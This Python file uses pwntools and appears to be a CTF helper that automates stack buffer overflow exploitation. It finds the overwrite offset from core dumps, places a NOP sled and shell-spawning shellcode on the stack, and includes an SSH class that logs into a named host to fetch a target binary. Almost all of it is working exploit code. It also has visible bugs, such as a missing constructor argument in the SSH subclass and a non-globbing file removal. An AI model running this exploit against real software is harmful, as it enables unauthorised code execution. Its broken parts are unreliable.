from enum import Enum
from pwn import *
import sys,os,glob

class Exploit_type(Enum):
    LOCAL=0
    REMOTESSH=1
    REMOTETTCP=2

class Exploit:
    def __init__(self, file_path, send_func):
        self.elf = file_path
        self.send_func = send_func

        if self.is_64bit_elf():
            self.arch = 'amd64'
        elif self.is_32bit_elf():
            self.arch = 'x86'
        else:
            raise Exception('Unknown architecture')

    def __str__(self):
        return "Type:"+str(self.elf)

    def is_64bit_elf(self):
        with open(self.elf,'rb') as f:
            return(f.read(5)[-1]) == 2

    def is_32bit_elf(self):
        with open(self.elf,'rb') as f:
            return (f.read(5)[-1]) == 1

    
    def find_offset(self):
        
        p = process(self.elf)

        if self.arch == 'amd64':
            self.send_func(p,cyclic(30,n=8))
        else:
            self.send_func(p,cyclic(30,n=4))
        p.wait()

        core = p.corefile

        if core.arch == 'i386':
            #print(f"{core.eip:x}")
            return cyclic_find(core.eip, n=4)
        elif core.arch == 'amd64':
            #print(f"{core.rsp:x}")
            return cyclic_find(core.read(core.rsp, 8), n=8)
        else:
            raise Exception(f'Unknown arch: {core.arch}')
    
    def find_stack_addr(self, offset):
        
        p = process(self.elf)

        if self.arch == 'amd64':
            payload = b'A' * (offset) + b'BBBBBBBB'
        else:
            payload = b'A' * (offset) + b'BBBB'

        self.send_func(p,payload)
        p.wait()

        core = p.corefile

        if core.arch == 'i386':
            #print(f"{core.eip:x}")
            return core.esp
        elif core.arch == 'amd64':
            #print(f"{core.rsp:x}")
            return core.rsp
        else:
            raise Exception(f'Unknown arch: {core.arch}')
    
    def ret2stack(self, offset=None, stack_addr=None):
        if offset == None:
            offset = self.find_offset()
        
        if stack_addr == None:
            stack_addr = self.find_stack_addr(offset)


        p = process(self.elf)
        if self.arch == 'amd64':
            context.update(arch='amd64',os='linux')

            payload = b'A' * offset
            payload += p64(stack_addr + 8)
            payload += asm(shellcraft.nop() * 0x10)
            payload += asm(shellcraft.sh())
        else:
            context.update(arch='x86',os='linux')

            payload = b'A' * offset
            payload += p32(stack_addr + 4)
            payload += asm(shellcraft.nop() * 0x10)
            payload += asm(shellcraft.sh())

        self.send_func(p,payload) 
        p.interactive()
    
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_value, traceback):

        files = glob.glob('core*')
        for f in files:
            os.remove(f)


class Exploit_SSH(Exploit):
    def __init__(self, ip, port, user,file_path,password=None):
        ssh_shell = ssh(user, ip, password=password, port=port)
        ssh_shell.download(file_path)

        file = file_path.split('/')[-1]

        st = os.stat(file)
        os.chmod(file, st.st_mode | stat.S_IEXEC)

        super().__init__(file)
    def __exit__(self, exc_type, exc_value, traceback):
        
        try:
            os.remove(self.elf)
            os.remove('core.*')
        except:
            pass


def test_ssh():
    with Exploit_SSH('serviel.fr', 22, 'paul', './ctf/example1') as exp:
        print(exp)
        
        print(exp.find_offset())


def fill_buf(p,data):
    p.sendline(data)

def test_local():
    with Exploit('./bin/vuln1',fill_buf) as exp:
        exp.ret2stack()



if __name__=="__main__":
    test_local()